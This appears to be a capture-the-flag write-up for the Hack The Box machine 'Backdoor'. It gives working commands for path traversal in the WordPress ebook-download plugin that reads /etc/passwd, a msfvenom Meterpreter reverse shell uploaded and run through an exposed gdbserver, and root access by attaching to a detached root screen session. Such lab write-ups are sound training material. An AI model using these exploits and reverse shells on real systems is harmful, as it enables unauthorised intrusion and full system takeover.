# Target
| Category          | Details                                                   |
|-------------------|-----------------------------------------------------------|
| 📝 **Name**       | [Backdoor](https://app.hackthebox.com/machines/Backdoor)  |  
| 🏷 **Type**       | HTB Machine                                               |
| 🖥 **OS**         | Linux                                                     |
| 🎯 **Difficulty** | Easy                                                      |
| 📁 **Tags**       | WordPress, ebook-download plugin, LFI, Metasploit, screen |

# Scan
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
```

# Attack path
1. [Identify `gdbserver` running on port 1337 with `procbuster` and directory traversal in `ebook-download` WordPress plugin](#identify-gdbserver-running-on-port-1337-with-procbuster-and-directory-traversal-in-ebook-download-wordpress-plugin)
2. [Use publicly available `gdbserver` to gain initial foothold via uploaded and executed Meterpreter reverse shell](#use-publicly-available-gdbserver-to-gain-initial-foothold-via-uploaded-and-executed-meterpreter-reverse-shell)
3. [Escalate to `root` user using detached `screen` session](#escalate-to-root-user-using-detached-screen-session)

### Identify `gdbserver` running on port 1337 with `procbuster` and directory traversal in `ebook-download` WordPress plugin

#### Add `backdoor.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Backdoor]
└─$ echo "$TARGET backdoor.htb" | sudo tee -a /etc/hosts
10.129.96.68 backdoor.htb
```

#### Discovery vulnerable `ebook-download` WordPress plugin
```
┌──(magicrc㉿perun)-[~/attack/HTB Backdoor]
└─$ curl -s http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt | grep tag
Stable tag: 1.1
```

#### Prepare exploit to use path traversal vulnerability in `ebook-download` to access local files on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Backdoor]
└─$ { cat <<'EOF'> exploit.sh
#!/bin/bash

curl -s -o - "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../..$1" \
    | sed "s|\(../../../../../..${1}\)\+||g" \
    | sed 's#<script>window\.close()</script>$##'
EOF
} && chmod +x exploit.sh && ./exploit.sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

#### Use [`procbuster`](https://github.com/magicrc/procbuster) and `exploit.sh` to find process listening on port 1337
```
┌──(magicrc㉿perun)-[~/attack/HTB Backdoor]
└─$ git clone -q https://github.com/magicrc/procbuster.git && \
./procbuster/procbuster.sh --file-read-cmd ./exploit.sh
PID     USER                 CMD
<SNIP>
988     user                 gdbserver --once 0.0.0.0:1337 /bin/true 
<SNIP>
```

### Use publicly available `gdbserver` to gain initial foothold via uploaded and executed Meterpreter reverse shell

#### Generate `linux/x64/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Backdoor]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f elf \
    -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Backdoor]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x64/meterpreter/reverse_tcp; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.14.153:4444
```

#### Use `gdb` to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Backdoor]
└─$ gdb shell                                                  
GNU gdb (Debian 16.2-8) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from shell...
(No debugging symbols found in shell)
(gdb) target extended-remote backdoor.htb:1337
Remote debugging using backdoor.htb:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
(gdb) remote put shell shell
Successfully sent file "shell".
(gdb) set remote exec-file /home/user/shell
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /home/user/shell from remote target...
Reading /home/user/shell from remote target...
Reading symbols from target:/home/user/shell...
(No debugging symbols found in target:/home/user/shell)
```

#### Confirm initial foothold gain
```
[*] Sending stage (3045380 bytes) to 10.129.96.68
[*] Meterpreter session 1 opened (10.10.14.153:4444 -> 10.129.96.68:38512) at 2025-08-18 21:42:22 +0200

meterpreter > getuid
Server username: user
```

### Escalate to `root` user using detached `screen` session

#### Identify detached `root` `screen` session
```
meterpreter > shell
Process 42125 created.
Channel 2 created.
ps aux      
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
<SNIP>
root        1002  0.0  0.1   6952  2468 ?        Ss   15:21   0:00 SCREEN -dmS root
<SNIP>
```

#### Stabilize shell and set `TERM`
```
/usr/bin/script -qc /bin/bash /dev/null
user@Backdoor:~$ export TERM=xterm
export TERM=xterm
user@Backdoor:~$
```

#### Attach to `root` `screen` session
```
user@Backdoor:~$ screen -x root/root
root@Backdoor:~# id                                                             
id                                                                              
uid=0(root) gid=0(root) groups=0(root)
```